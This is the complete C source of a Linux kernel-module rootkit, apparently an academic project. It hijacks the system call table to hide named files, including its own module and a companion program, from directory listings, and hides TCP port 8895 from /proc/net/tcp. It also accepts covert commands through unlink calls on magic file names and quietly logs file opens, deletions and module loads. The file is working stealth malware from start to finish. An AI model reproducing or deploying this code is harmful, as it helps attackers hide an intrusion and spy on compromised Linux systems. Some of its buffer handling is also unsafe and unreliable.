#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h> 
#include <linux/fs.h>
#include <linux/bio.h>
#include <linux/vmalloc.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>

/*************** Module description ********************/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng Yang and Matthew hammond");
MODULE_DESCRIPTION("Rootkit main entry"); 

/*************** Methods declaration ********************/
// Hook system call table and hide file by name
static unsigned long **hook_syscall_table(void);
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
static int callMonitor(char *type, const char *msg);
static int configMonitor(char *msg);
static void hook_port(void);

// Kernel system call
int (*kernel_seq_show)(struct seq_file *seq, void *v);
asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage long (*kernel_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*kernel_unlink)(const char __user *pathname);
asmlinkage long (*kernel_unlinkat)(int dfd, const char __user * pathname, int flag);
asmlinkage long (*kernel_init_module)(void __user *  umod,  unsigned long len, 
                                              const char __user * uargs);

// Hooked system call
int hooked_seq_show(struct seq_file *seq, void *v);
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
asmlinkage long hooked_unlink(const char __user *pathname);
asmlinkage long hooked_unlinkat(int dfd, const char __user * pathname, int flag);
asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                              const char __user * uargs);

/*************** Properties ********************/
char *INEXISTFILE = "HIDEAFILEINKERNEL";
char *INEXISTMONITOR = "SETMONITORPROGRAM";
char *hidfiles[256];
char *monitor = NULL;
char *workdir = NULL;
int port = 8895;
int filenum;
int moni_open;
int moni_unlink;
int moni_init_module;

/*************** Struct ********************/
struct linux_dirent {
   long           d_ino;
   off_t          d_off;
   unsigned short d_reclen;
   char           d_name[];
};


/*
 * Disable write protection for hook system call table
 */
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
asmlinkage unsigned long **syscall_table;
 
static int lkm_init(void)
{
    printk("Hello world, our rootkit(hide a file) module successfully loaded\n");
    syscall_table = hook_syscall_table();
    
    DISABLE_WRITE_PROTECTION;
    kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
    kernel_getdents = (void *)syscall_table[__NR_getdents]; 
    kernel_open = (void *)syscall_table[__NR_open]; 
    kernel_unlink = (void *)syscall_table[__NR_unlink]; 
    kernel_unlinkat = (void *)syscall_table[__NR_unlinkat]; 
    kernel_init_module = (void *)syscall_table[__NR_init_module]; 
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    syscall_table[__NR_getdents] = (unsigned long *)hooked_getdents;
    syscall_table[__NR_open] = (unsigned long *)hooked_open;
    syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
    syscall_table[__NR_unlinkat] = (unsigned long *)hooked_unlinkat;
    syscall_table[__NR_init_module] = (unsigned long *)hooked_init_module;
    ENABLE_WRITE_PROTECTION;
    
    hook_port();
    
    hidfiles[0] = "cmdoutput.txttmp";
    hidfiles[1] = "myrootkit.ko";
    hidfiles[2] = "ccprogram";
    hidfiles[3] = "ccprogram.c";
    hidfiles[4] = "monitoroutput.txttmp";
    filenum=5;
    moni_open = 0;
    moni_unlink = 0;
    moni_init_module = 0;
    
    return 0;    
}

/**
 * @brief This is the function to hook system call table
 * Before replace the original system call, we need to disable the system call table write protection.
 * @return the entry(array) of system call table
 */
unsigned long ** hook_syscall_table(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}

/**
 * @brief Hide a specified file use linux_dirent
 * @param f_name : the file we want to hide 
 * @param dirp : the structure dirent which point to a specified file(inode) 
 * @param count : the size of this structure
 * @return 
 */
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
{
    struct linux_dirent64 *dp;
    long cur_addr, cur_reclen, next_addr;
    
    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
        dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
        
        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
            
            cur_reclen = dp->d_reclen;                              // Store the current dirent length
            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
            
            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
            count -= cur_reclen;                                    // Modify the count
        }
    }

    return count;
}

/**
 * @brief Hide a specified file use linux_dirent
 * @param f_name : the file we want to hide 
 * @param dirp : the structure dirent which point to a specified file(inode) 
 * @param count : the size of this structure
 * @return 
 */
static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count)
{
    struct linux_dirent *dp;
    long cur_addr, cur_reclen, next_addr;
    
    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
        dp = (struct linux_dirent *)((char *)dirp + cur_addr);
        
        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
            
            cur_reclen = dp->d_reclen;                              // Store the current dirent length
            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
            
            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
            count -= cur_reclen;                                    // Modify the count
        }
    }

    return count;
}

/**
 * @brief A hooked getdents64 for hide the file from filesystem
 * @param fd
 * @param count
 * @return 
 */
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long rv;
    int i;
    
    rv = kernel_getdents64(fd, dirp, count);
    
    for(i=0; i<filenum; i++){
        rv = hide_file64(hidfiles[i], dirp, rv);
    }
    
    return rv;
}

/**
 * @brief A hooked getdents64 for hide the file from filesystem
 * @param fd
 * @param count
 * @return 
 */
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
    long rv;
    int i;
    
    rv = kernel_getdents(fd, dirp, count);
    
    for(i=0; i<filenum; i++){
        rv = hide_file(hidfiles[i], dirp, rv);
    }
    
    return rv;
}

/**
 * @brief A hooked open for filesystem
 * @return 
 */
asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
    if(moni_open && strncmp(filename, workdir, strlen(workdir)) != 0){
        callMonitor("open", filename);
    }
           
    return kernel_open(filename, flags, mode);
}

/**
 * @brief A hooked init module
 * @return 
 */
asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                              const char __user * uargs){
    if(moni_init_module){
        callMonitor("sys_init_module", (char*) umod);
    }
    
    return kernel_init_module(umod, len, uargs);
}

/**
 * @brief A hooked unlinkat (command 'rm')
 * @return 
 */
asmlinkage long hooked_unlinkat(int dfd, const char __user * pathname, int flag){
    if(moni_unlink){
        callMonitor("unlink", pathname);
    }
    
    return kernel_unlinkat(dfd, pathname, flag);
}

asmlinkage long hooked_unlink(const char __user *filename){
    int i, j;
    char *value;
    
    //Hide a new type of file
    if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
        value = (char*) vmalloc(strlen(INEXISTFILE) * sizeof(char*));
        for(i=0, j=-1; i<strlen(filename); i++){
            if(j>-1){
                value[j] = filename[i];
                j++;
            } else if(filename[i] == '%'){
                j=0;
            }
        }
        if(j>0){
            if(value[j-1] == '\n'){
                value[j-1] = '\0';
            } else {
                value[j] = '\0';
            }
            hidfiles[filenum] = value;
            filenum++;
        }
    } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
        value = (char*) vmalloc(strlen(INEXISTMONITOR) * sizeof(char*));
        for(i=0, j=-1; i<strlen(filename); i++){
            if(j>-1){
                value[j] = filename[i];
                j++;
            } else if(filename[i] == '%'){
                j=0;
            }
        }
        if(j>0){
            if(value[j-1] == '\n'){
                value[j-1] = '\0';
            } else {
                value[j] = '\0';
            }
            configMonitor(value);
        }
    } else if(moni_unlink){
        callMonitor("unlink", filename);
    }
    return kernel_unlink(filename);
}

int hooked_seq_show(struct seq_file *seq, void *v){
    int ret;
    char needle[6];
    
    snprintf(needle, 6, ":%04X", port);
    ret = kernel_seq_show(seq, v);

    if (strnstr(seq->buf + seq->count - 150, needle, 150)) {
        seq->count -= 150;
    }

    return ret;
}

static void hook_port(void){
    struct file *filp;                                      
    struct tcp_seq_afinfo *afinfo;                                  
                                                         
    filp = filp_open("/proc/net/tcp", O_RDONLY, 0);                 
    if (IS_ERR(filp)) {                             
        return;                               
    } 
    afinfo = PDE_DATA(filp->f_path.dentry->d_inode); 
    kernel_seq_show = afinfo->seq_ops.show;                         
    afinfo->seq_ops.show = hooked_seq_show;                         
                                                     
    filp_close(filp, 0);                               
              
}
 
static void lkm_exit(void)
{
    printk("Hello world, our rootkit module removed\n");
    
    // Recover the original system call setting
    DISABLE_WRITE_PROTECTION;
    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
    syscall_table[__NR_getdents] = (unsigned long *)kernel_getdents;
    syscall_table[__NR_open] = (unsigned long *)kernel_open;
    syscall_table[__NR_unlink] = (unsigned long *)kernel_unlink;
    syscall_table[__NR_unlinkat] = (unsigned long *)kernel_unlinkat;
    syscall_table[__NR_init_module] = (unsigned long *)kernel_init_module;
    ENABLE_WRITE_PROTECTION;
}

static int callMonitor(char *type, const char *msg){
    if(monitor == NULL) return -1;
    char m[256] = "";
    
    mm_segment_t old_fs;
    struct file *f;
    loff_t pos = 0;
    int ret;
    struct inode *inode;
    
    strcat(m, type);
    strcat(m, " ");
    strcat(m, msg);
    strcat(m, "\n");
    
    f = filp_open(monitor, O_RDWR|O_LARGEFILE|O_CREAT|O_APPEND, 0666);
    if (IS_ERR(f)) {
        return 0;
    }
    
    inode = f->f_mapping->host;
    
    
    old_fs = get_fs();
    set_fs(get_ds());
    ret = vfs_write(f, (char *)m, strlen(m) + 1, &pos);
    set_fs(old_fs);
    
    filp_close(f, NULL);
    return 0;
}

static int configMonitor(char *msg){
    while(*msg == ' ') msg++;
    
    if(strncmp(msg, "set", 3) == 0){
        msg += 4;
        workdir = (char*) vmalloc(strlen(msg) + 1);
        memcpy(workdir, msg, strlen(msg) + 1);
        monitor = (char*) vmalloc(strlen(msg) + 20);
        memcpy(monitor, msg, strlen(msg) + 1);
        strcat(monitor, "/monitoroutput.txttmp");
    } else if(strncmp(msg, "open", 4) == 0){
        moni_open = 1;
    } else if(strncmp(msg, "unlink", 6) == 0){
        moni_unlink = 1;
    } else if(strncmp(msg, "init_module", 6) == 0){
        moni_init_module = 1;
    }

    return 0;
}
 
module_init(lkm_init);
module_exit(lkm_exit);